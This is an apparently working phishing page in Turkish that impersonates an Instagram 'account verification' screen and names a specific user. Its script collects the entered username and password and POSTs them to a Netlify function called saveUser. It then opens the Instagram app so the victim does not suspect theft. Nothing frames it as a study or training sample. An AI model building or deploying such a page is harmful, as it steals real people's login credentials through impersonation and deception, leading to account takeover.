<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>İnstagram Hesap Doğrulaması</title>
  <style>
    body {
      background: url('images/bg1.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: Arial, sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background: rgba(0,0,0,0.6);
      padding: 30px;
      border-radius: 10px;
      max-width: 400px;
      width: 100%;
      box-sizing: border-box;
    }
    h1 {
      font-weight: bold;
      margin-bottom: 10px;
      text-align: center;
    }
    .username {
      color: #00b0ff; /* Kendini belli eden mavi */
      font-weight: bold;
      text-align: center;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }
    button {
      width: 100%;
      background-color: #0095f6;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
    }
    button:hover {
      background-color: #007acc;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Instagram Hesap Doğrulaması Gerekiyor</h1>
    <div class="username">Priwant o5man</div>
    <form id="loginForm">
      <input id="username" type="text" placeholder="Kullanıcı Adı" required />
      <input id="password" type="password" placeholder="Şifre" required />
      <button type="submit">Doğrula</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!username || !password) {
        alert('Lütfen kullanıcı adı ve şifre girin.');
        return;
      }

      try {
        const res = await fetch('/.netlify/functions/saveUser', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password }),
        });

        const data = await res.json();

        if (res.ok) {
          alert(data.message);  // Kullanıcı kaydedildi
          // Başarılı doğrulama sonrası Instagram uygulamasına yönlendir
          window.location.href = "instagram://user?username=" + encodeURIComponent(username);
        } else {
          alert(data.error || 'Bir hata oluştu.');
        }
      } catch (error) {
        alert('Sunucuya bağlanırken hata oluştu.');
        console.error(error);
      }
    });
  </script>
</body>
</html>
